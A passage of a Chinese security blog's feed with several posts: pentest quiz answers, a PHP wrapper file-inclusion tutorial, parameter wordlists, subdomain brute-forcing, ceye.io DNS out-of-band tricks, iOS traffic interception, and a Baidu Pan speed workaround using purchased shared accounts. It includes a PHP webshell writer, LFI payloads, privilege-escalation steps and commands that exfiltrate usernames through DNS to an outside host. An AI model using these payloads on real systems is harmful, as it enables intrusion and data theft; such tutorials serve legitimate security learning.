同时也存在任意文件下载漏洞，并且数据库开启了外连接，那么如何对此Web应用程序进行渗透测试？<br>11.列举出您所知道的所有开源组件高危漏洞(十个以上)<br>12.Windows、Linux、数据库的加固降权思路，任选其一<br>13.请写出曾经绕过WAF的经过(SQLi，XSS，上传漏洞选一)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">·</span><br><span class="line">   1)iis6.0: </span><br><span class="line">   /xx.asp/xx.jsp</span><br><span class="line">   xx.asp;.jsp</span><br><span class="line">   2)iis7.0/iis7.5/nginx&lt;8.03</span><br><span class="line">   在Fast-CGI开启下，上传sp.jpg，内容:&lt;?PHP fputs(fopen(&apos;shell.php&apos;),&apos;w&apos;),&apos;&lt;?php </span><br><span class="line">   eval()$_POST[cmd]?&gt;&apos;);&apos;?&gt;</span><br><span class="line">   访问sp.jpg/.php，就会生成shell.php</span><br><span class="line">   3)nginx&lt;8.03</span><br><span class="line">   %00</span><br><span class="line">   4)apache从右向左</span><br><span class="line">   5）windows环境空格绕过</span><br><span class="line">   6）上传.htaccess</span><br><span class="line">· netstat -an</span><br><span class="line">· sqlmap注入点写shell，连菜刀，提权，内网渗透</span><br><span class="line">·</span><br><span class="line">   1）反射信，存储型，DOM型</span><br><span class="line">   2）绕过:8进制转换/16进制转换，hex编码，string.fromcharcode转ascill，UBB标签，</span><br><span class="line">· 可以</span><br><span class="line">· select column_name from information_schema.clums where table_schema=&apos;hellword&apos; and table_name=&apos;users&apos;</span><br><span class="line">· 存在，代码执行漏洞，2个参数都由用户自定义，可构造命令执行</span><br><span class="line">· 邮件查看源代码，DNS历史查询，国外网站ping，寻找phpinfo,二级域名可能没做cdn，社工。</span><br><span class="line">· windows一般systetminfo查看系统补丁，然后使用对应的exp，也可以针对服务器第三方的服务进行提权</span><br><span class="line">linux查看(uname -a)系统内核版本，gcc编译exp进行提权,也可以尝试 /etc/passwd是否可写， shadow是否可读，破解HASH，python虚拟终端登陆root,ls -l /etc/cron* 查看计划任务是否可写， SUID程序提权，查看错误配置等等。</span><br><span class="line">· 首先尝试下载tomcat配置文件(../config/server.xml)，找到数据库账户密码，然后外连，尝试getshell</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试笔试题&quot;&gt;&lt;a href=&quot;#渗透测试笔试题&quot; class=&quot;headerlink&quot; title=&quot;渗透测试笔试题&quot;&gt;&lt;/a&gt;渗透测试笔试题&lt;/h2&gt;&lt;h4 id=&quot;填空题&quot;&gt;&lt;a href=&quot;#填空题&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="资源分享" scheme="txf7.xyz/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>百度云超级会员下载（共享号实现的无缝加速）</title>
    <link href="txf7.xyz/2018/12/16/baiduyunhuiyuan/"/>
    <id>txf7.xyz/2018/12/16/baiduyunhuiyuan/</id>
    <published>2018-12-16T04:00:59.000Z</published>
    <updated>2018-12-22T08:28:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>经常用百度云的人可能发现现在的破解加速和谐的很快，无奈空叹，难受!<br>之前我都是25一个月直接开的会员，最近发现到期了，不想再续费了，于是全网搜索了一番。</p><h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p>首先我们需要下载一款神器：<a href="https://www.lanzous.com/i2dwyta" target="_blank" rel="noopener">PanDownload</a><br>因为他支持多账号登陆，这个时候我们去淘宝购买一个共享账号30天的</p><p><img src="http://upload-images.jianshu.io/upload_images/14134003-ff7c2b03b1340333.png-quanzi?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file"><br>然后登陆我们自己的账号和买来的账号。</p><p><img src="http://upload-images.jianshu.io/upload_images/14134003-f36aa73008780ad8.png-quanzi?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file"></p><h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><ul><li><p>先将自己网盘下需要下载的资源分享出来。<br><img src="http://upload-images.jianshu.io/upload_images/14134003-0e96c93f698a0f74.png-quanzi?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file"></p></li><li><p>然后打开<strong>更多功能</strong>里面的<strong>打开分享链接</strong>直接下载<br><img src="http://upload-images.jianshu.io/upload_images/14134003-e690a2ec6f5ae8b6.png-quanzi?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file"></p></li><li><p>这个时候我们发现我们现在下载的速度就是超级会员的下载速度！<br><img src="http://upload-images.jianshu.io/upload_images/14134003-c66ff60cd3aa0fa2.png-quanzi?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file"></p></li></ul><p>参考：</p><p><a href="https://www.52pojie.cn/thread-790694-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-790694-1-1.html</a></p><p><a href="https://www.52pojie.cn/thread-838826-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-838826-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h2&gt;&lt;p&gt;经常用百度云的人可能发现现在的破解加速和谐的很快，无奈空叹，难受!&lt;br&gt;之前我都是25一个月直接开的会员，最近发现到期了，不想再续
      
    
    </summary>
    
      <category term="资源分享" scheme="txf7.xyz/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="txf7.xyz/2018/12/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>txf7.xyz/2018/12/07/php伪协议/</id>
    <published>2018-12-07T03:01:04.000Z</published>
    <updated>2018-12-25T06:36:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&apos;file&apos;])</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="情况一：不需要截断："><a href="#情况一：不需要截断：" class="headerlink" title="情况一：不需要截断："></a>情况一：不需要截断：</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-d4e083a2ea13e9a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test.php"></p><h4 id="情况二：需要截断："><a href="#情况二：需要截断：" class="headerlink" title="情况二：需要截断："></a>情况二：需要截断：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&apos;file&apos;].’.php’)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php&lt;=5.2<br>%00截断</p><h3 id="【file-协议】"><a href="#【file-协议】" class="headerlink" title="【file://协议】"></a>【file://协议】</h3><p>使用方法：</p><blockquote><p>file:// [文件的绝对路径和文件名]</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-b0feeaf60e001b7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file://协议"></p><blockquote><p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/test.php?file=php://filter/read=convert.base64-encode/resource=./test.php</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-aa82fcde0f56f030.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="base64read"></p><h3 id="【input-协议】"><a href="#【input-协议】" class="headerlink" title="【input://协议】"></a>【input://协议】</h3><p><img src="https://upload-images.jianshu.io/upload_images/14134003-5e5fef28b7985b5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php://input"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-d3b014ce981a29ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="写shell"></p><h3 id="【zip-协议】"><a href="#【zip-协议】" class="headerlink" title="【zip://协议】"></a>【zip://协议】</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=zip://D:/phpStudy/WWW/txf.zip%23txf.txt</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-9d78f49a0e7988fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="zip"></p><h3 id="【bzip2-协议】"><a href="#【bzip2-协议】" class="headerlink" title="【bzip2://协议】"></a>【bzip2://协议】</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=compress.zlib://./txf.txt</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-fd70bab1f0d50cff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="bzip2"></p><h3 id="【data-协议】"><a href="#【data-协议】" class="headerlink" title="【data://协议】"></a>【data://协议】</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://localhost/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">http://localhost/test.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://localhost/test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-d5fa5bd42abc6ae3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="data://协议"></p><h2 id="封装协议"><a href="#封装协议" class="headerlink" title="封装协议"></a>封装协议</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-4dcc08ba0c371167.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PHP封装协议"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;test-php&quot;&gt;&lt;a href=&quot;#test-php&quot; class=&quot;headerlink&quot; title=&quot;test.php&quot;&gt;&lt;/a&gt;test.php&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>逻辑权限字典</title>
    <link href="txf7.xyz/2018/12/01/%E9%80%BB%E8%BE%91%E6%9D%83%E9%99%90%E5%AD%97%E5%85%B8/"/>
    <id>txf7.xyz/2018/12/01/逻辑权限字典/</id>
    <published>2018-12-01T02:03:47.000Z</published>
    <updated>2019-03-02T10:36:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">callback=txf</span><br><span class="line">cb=txf</span><br><span class="line">jsonp=txf</span><br><span class="line">jsonpcallback=txf</span><br><span class="line">jsonpcb=txf</span><br><span class="line">jsconpcb=txf</span><br><span class="line">json=txf</span><br><span class="line">jsonp=txf</span><br><span class="line">jsoncallback=txf</span><br><span class="line">jcb=txf</span><br><span class="line">call=txf</span><br><span class="line">jsoncallb=txf</span><br><span class="line">json_callb=txf</span><br><span class="line">jsonp_callback=txf</span><br><span class="line">json_callback=txf</span><br><span class="line">jsonp_cb=txf</span><br><span class="line">callbackparam=txf</span><br><span class="line">jsconpcb=txf</span><br><span class="line">jscon=txf</span><br><span class="line">jsconcallback=txf</span><br></pre></td></tr></table></figure><h2 id="管理员"><a href="#管理员" class="headerlink" title="管理员"></a>管理员</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">access=1</span><br><span class="line">access=true</span><br><span class="line">access=y</span><br><span class="line">adm=1</span><br><span class="line">adm1n=1</span><br><span class="line">adm1n=true</span><br><span class="line">adm1n=y</span><br><span class="line">adm1n=yes</span><br><span class="line">admin=1</span><br><span class="line">admin=true</span><br><span class="line">admin=y</span><br><span class="line">admin=yes</span><br><span class="line">adm=true</span><br><span class="line">adm=y</span><br><span class="line">admin=yes</span><br><span class="line">adm=yes</span><br><span class="line">dbg=1</span><br><span class="line">dbg=true</span><br><span class="line">dbg=y</span><br><span class="line">dbg=yes</span><br><span class="line">debug=1</span><br><span class="line">debug=true</span><br><span class="line">debug=y</span><br><span class="line">debug=yes</span><br><span class="line">edit=1</span><br><span class="line">edit=true</span><br><span class="line">edit=y</span><br><span class="line">edit=yes</span><br><span class="line">grant=1</span><br><span class="line">grant=true</span><br><span class="line">grant=y</span><br><span class="line">grant=yes</span><br><span class="line">test=1</span><br><span class="line">test=true</span><br><span class="line">test=y</span><br><span class="line">test=yes</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;回调&quot;&gt;&lt;a href=&quot;#回调&quot; class=&quot;headerlink&quot; title=&quot;回调&quot;&gt;&lt;/a&gt;回调&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
      <category term="资源分享" scheme="txf7.xyz/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>subDomainsBrute安装说明</title>
    <link href="txf7.xyz/2018/11/21/subdomain/"/>
    <id>txf7.xyz/2018/11/21/subdomain/</id>
    <published>2018-11-21T01:58:59.000Z</published>
    <updated>2018-12-24T01:59:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python环境"><a href="#python环境" class="headerlink" title="python环境"></a>python环境</h2><p>我用的2.7.10</p><h2 id="子域名爆破（subDomainsBrute）"><a href="#子域名爆破（subDomainsBrute）" class="headerlink" title="子域名爆破（subDomainsBrute）"></a>子域名爆破（subDomainsBrute）</h2><p><a href="https://codeload.github.com/lijiejie/subDomainsBrute/zip/master" target="_blank" rel="noopener">github下载</a></p><h2 id="更新pip"><a href="#更新pip" class="headerlink" title="更新pip"></a>更新pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><h2 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install dnspython gevent</span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Usage: subDomainsBrute.py [options] target.com</span><br><span class="line">Options:</span><br><span class="line">  --version             show program&apos;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -f FILE               File contains new line delimited subs, default is</span><br><span class="line">                        subnames.txt.</span><br><span class="line">  --full                Full scan, NAMES FILE subnames_full.txt will be used</span><br><span class="line">                        to brute</span><br><span class="line">  -i, --ignore-intranet</span><br><span class="line">                        Ignore domains pointed to private IPs</span><br><span class="line">  -t THREADS, --threads=THREADS</span><br><span class="line">                        Num of scan threads, 200 by default</span><br><span class="line">  -p PROCESS, --process=PROCESS</span><br><span class="line">                        Num of scan Process, 6 by default</span><br><span class="line">  -o OUTPUT, --output=OUTPUT</span><br><span class="line">                        Output file name. default is &#123;target&#125;.txt</span><br></pre></td></tr></table></figure><h2 id="kali下载直接用"><a href="#kali下载直接用" class="headerlink" title="kali下载直接用"></a>kali下载直接用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python subDomainsBrute.py xxx.com</span><br></pre></td></tr></table></figure><p><strong>不要加www</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python环境&quot;&gt;&lt;a href=&quot;#python环境&quot; class=&quot;headerlink&quot; title=&quot;python环境&quot;&gt;&lt;/a&gt;python环境&lt;/h2&gt;&lt;p&gt;我用的2.7.10&lt;/p&gt;
&lt;h2 id=&quot;子域名爆破（subDomainsBrute）&quot;&gt;
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>ceye的基础应用</title>
    <link href="txf7.xyz/2018/11/11/ceye/"/>
    <id>txf7.xyz/2018/11/11/ceye/</id>
    <published>2018-11-11T02:28:02.000Z</published>
    <updated>2018-12-22T08:29:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ceyo网站"><a href="#ceyo网站" class="headerlink" title="ceyo网站"></a>ceyo网站</h1><h3>注册</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/</span><br></pre></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.1odz7u.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-836ea45fb6d94760.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-e9fe9b53317057ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ceye"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.1odz7u.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-705e2b3816eceb7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-30614d9dd0f60d50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ceye"></p><h3 id="win的常用变量"><a href="#win的常用变量" class="headerlink" title="win的常用变量"></a>win的常用变量</h3><hr><table><thead><tr><th>//变量</th><th style="text-align:center">类型</th><th style="text-align:right">描述</th></tr></thead><tbody><tr><td>//%ALLUSERSPROFILE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回“所有用户”配置文件的位置。</td></tr><tr><td>//%APPDATA%</td><td style="text-align:center">本地</td><td style="text-align:right">返回默认情况下应用程序存储数据的位置。</td></tr><tr><td>//%CD%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前目录字符串。</td></tr><tr><td>//%CMDCMDLINE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回用来启动当前的 Cmd.exe 的准确命令行。</td></tr><tr><td>//%CMDEXTVERSION%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前的“命令处理程序扩展”的版本号。</td></tr><tr><td>//%COMPUTERNAME%</td><td style="text-align:center">系统</td><td style="text-align:right">返回计算机的名称。</td></tr><tr><td>//%COMSPEC%</td><td style="text-align:center">系统</td><td style="text-align:right">返回命令行解释器可执行程序的准确路径。</td></tr><tr><td>//%DATE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td></tr><tr><td>//%ERRORLEVEL%</td><td style="text-align:center">系统</td><td style="text-align:right">返回上一条命令的错误代码。通常用非零值表示错误。</td></tr><tr><td>//%HOMEDRIVE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%HOMEPATH%</td><td style="text-align:center">系统</td><td style="text-align:right">返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%HOMESHARE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>//%LOGONSERVER%</td><td style="text-align:center">本地</td><td style="text-align:right">返回验证当前登录会话的域控制器的名称。</td></tr><tr><td>//%NUMBER_OF_PROCESSORS%</td><td style="text-align:center">系统</td><td style="text-align:right">指定安装在计算机上的处理器的数目。</td></tr><tr><td>//%OS%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td></tr><tr><td>//%PATH%</td><td style="text-align:center">系统</td><td style="text-align:right">指定可执行文件的搜索路径。</td></tr><tr><td>//%PATHEXT%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统认为可执行的文件扩展名的列表。</td></tr><tr><td>//%PROCESSOR_ARCHITECTURE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</td></tr><tr><td>//%PROCESSOR_IDENTFIER%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器说明。</td></tr><tr><td>//%PROCESSOR_LEVEL%</td><td style="text-align:center">系统</td><td style="text-align:right">返回计算机上安装的处理器的型号。</td></tr><tr><td>//%PROCESSOR_REVISION%</td><td style="text-align:center">系统</td><td style="text-align:right">返回处理器的版本号。</td></tr><tr><td>//%PROMPT%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</td></tr><tr><td>//%RANDOM%</td><td style="text-align:center">系统</td><td style="text-align:right">返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</td></tr><tr><td>//%SYSTEMDRIVE%</td><td style="text-align:center">系统</td><td style="text-align:right">返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</td></tr><tr><td>//%SYSTEMROOT%</td><td style="text-align:center">系统</td><td style="text-align:right">返回 Windows server operating system 根目录的位置。</td></tr><tr><td>//%TEMP%和%TMP%</td><td style="text-align:center">系统和用户</td><td style="text-align:right">返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</td></tr><tr><td>//%TIME%</td><td style="text-align:center">系统</td><td style="text-align:right">返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。</td></tr><tr><td>//%USERDOMAIN%</td><td style="text-align:center">本地</td><td style="text-align:right">返回包含用户帐户的域的名称。</td></tr><tr><td>//%USERNAME%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前登录的用户的名称。</td></tr><tr><td>//%USERPROFILE%</td><td style="text-align:center">本地</td><td style="text-align:right">返回当前用户的配置文件的位置。</td></tr><tr><td>//%WINDIR%</td><td style="text-align:center">系统</td><td style="text-align:right">返回操作系统目录的位置。</td></tr></tbody></table><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ceyo网站&quot;&gt;&lt;a href=&quot;#ceyo网站&quot; class=&quot;headerlink&quot; title=&quot;ceyo网站&quot;&gt;&lt;/a&gt;ceyo网站&lt;/h1&gt;&lt;h3&gt;注册&lt;/h3&gt;

&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>IOS-APP抓包设置</title>
    <link href="txf7.xyz/2018/10/02/appios/"/>
    <id>txf7.xyz/2018/10/02/appios/</id>
    <published>2018-10-02T01:17:15.000Z</published>
    <updated>2018-12-24T02:00:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ios-手机设置"><a href="#ios-手机设置" class="headerlink" title="ios 手机设置"></a>ios 手机设置</h2><p>1.电脑与手机处于同一局域网，在ios无线网络设置手动代理<br><img src="https://upload-images.jianshu.io/upload_images/14134003-c0b8ca5ddb8c7e7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="app"><br>2.在burpsuite设置代理<br><img src="https://upload-images.jianshu.io/upload_images/14134003-1a4750d077bf73be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="burp"><br>3.用手机访问设置的代理ip下载CA证书<br><img src="https://upload-images.jianshu.io/upload_images/14134003-c270d220159de209.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CA"><br>4.安装CA证书<br><img src="https://upload-images.jianshu.io/upload_images/14134003-f3df993c8a6648c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安装CA"></p><h2 id="发现有些APP无法抓到数据包"><a href="#发现有些APP无法抓到数据包" class="headerlink" title="发现有些APP无法抓到数据包"></a>发现有些APP无法抓到数据包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOS手机设置--通用--关于本机--证书信任设置开启状态</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-676652cab947d881.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="开启信任证书设置"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ios-手机设置&quot;&gt;&lt;a href=&quot;#ios-手机设置&quot; class=&quot;headerlink&quot; title=&quot;ios 手机设置&quot;&gt;&lt;/a&gt;ios 手机设置&lt;/h2&gt;&lt;p&gt;1.电脑与手机处于同一局域网，在ios无线网络设置手动代理&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="app渗透" scheme="txf7.xyz/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulhub的安装调试</title>
    <link href="txf7.xyz/2018/08/24/vulhub/"/>
    <id>txf7.xyz/2018/08/24/vulhub/</id>
    <published>2018-08-24T02:20:47.000Z</published>
    <updated>2019-01-11T09:28:48.000Z</updated>
    
